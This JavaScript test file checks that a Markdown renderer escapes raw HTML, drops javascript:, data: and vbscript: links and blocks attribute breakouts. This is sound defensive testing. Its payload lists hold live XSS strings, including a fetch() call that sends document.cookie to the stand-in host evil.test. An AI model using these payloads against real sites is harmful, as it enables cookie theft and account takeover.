import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import {
    escapeHtml,
    renderMarkdown,
    safeImageSrc,
    safeLinkHref,
} from "../src/lib/markdown.js";

test("renderMarkdown still renders ordinary Markdown", () => {
    const html = renderMarkdown("# Cím\n\nEgy **vastag** szó.");
    assert.match(html, /<h1[^>]*>Cím<\/h1>/);
    assert.match(html, /<strong>vastag<\/strong>/);
});

test("renderMarkdown gives nothing back for empty input", () => {
    assert.equal(renderMarkdown(""), "");
    assert.equal(renderMarkdown("   "), "");
    assert.equal(renderMarkdown(null), "");
    assert.equal(renderMarkdown(undefined), "");
    assert.equal(renderMarkdown(42), "");
});

test("raw HTML in the source becomes text, not markup", () => {
    const payloads = [
        '<img src=x onerror="fetch(`https://evil.test?c=`+document.cookie)">',
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        '<iframe src="https://evil.test"></iframe>',
        "<a href=\"#\" onclick=\"alert(1)\">kattints</a>",
        "<style>body{display:none}</style>",
        "<div data-x>szöveg</div>",
    ];
    for (const payload of payloads) {
        const html = renderMarkdown(payload);
        assert.doesNotMatch(html, /<script|<iframe|<svg|<style|<div/i, payload);
        // No element anywhere carries an event handler attribute.
        assert.doesNotMatch(html, /<[a-z][^>]*\son[a-z]+\s*=/i, payload);
        assert.match(html, /&lt;/, payload);
    }
});

test("inline HTML inside a paragraph is escaped too", () => {
    const html = renderMarkdown("Szép hely <img src=x onerror=alert(1)> igazán.");
    assert.doesNotMatch(html, /<img/i);
    assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/);
});

test("javascript: and data: link targets are dropped, the label stays", () => {
    for (const href of [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        " javascript:alert(1)",
        "javascript&#58;alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
    ]) {
        const html = renderMarkdown(`[kattints](${href})`);
        assert.doesNotMatch(html, /<a /i, href);
        assert.match(html, /kattints/, href);
        assert.equal(safeLinkHref(href), null, href);
    }
});

test("normal link targets survive and carry rel hardening", () => {
    const html = renderMarkdown("[Lámsza](https://lamsza.com/megyek)");
    assert.match(html, /<a href="https:\/\/lamsza\.com\/megyek"/);
    assert.match(html, /rel="nofollow noopener noreferrer"/);

    for (const href of [
        "https://lamsza.com",
        "http://example.test/a?b=1#c",
        "mailto:hello@lamsza.com",
        "tel:+40740000000",
        "/megyek",
        "#lista",
        "?q=kutya",
        "kepek/varak.jpg",
    ]) {
        assert.equal(safeLinkHref(href), href.replace(/\s/g, ""), href);
    }
});

test("image targets are limited to http and https and relative paths", () => {
    assert.equal(safeImageSrc("javascript:alert(1)"), null);
    assert.equal(safeImageSrc("mailto:a@b.test"), null);
    assert.equal(safeImageSrc("https://lamsza.com/a.png"), "https://lamsza.com/a.png");
    assert.equal(safeImageSrc("/api/media/entry-images/a.png"), "/api/media/entry-images/a.png");

    const html = renderMarkdown('![vár](javascript:alert(1) "cím")');
    assert.doesNotMatch(html, /<img/i);
    assert.match(html, /vár/);
});

test("a quote in a title or alt text cannot break out of the attribute", () => {
    const html = renderMarkdown('![" onerror="alert(1)](https://lamsza.com/a.png)');
    assert.doesNotMatch(html, /onerror="alert/);
    assert.match(html, /alt="&quot; onerror=&quot;alert\(1\)"/);

    const link = renderMarkdown('[szö](https://lamsza.com "x\\" onmouseover=\\"alert(1)")');
    assert.doesNotMatch(link, /onmouseover="alert/);
});

test("escapeHtml covers every character that can start a tag or end an attribute", () => {
    assert.equal(escapeHtml(`<>&"'`), "&lt;&gt;&amp;&quot;&#39;");
    assert.equal(escapeHtml(null), "");
    assert.equal(escapeHtml(undefined), "");
});

test("the Markdown component renders through renderMarkdown, never marked directly", () => {
    const source = readFileSync(
        new URL("../src/lib/components/Markdown.svelte", import.meta.url),
        "utf-8",
    );
    assert.match(source, /renderMarkdown\(source\)/);
    assert.doesNotMatch(source, /marked\.parse/);
});
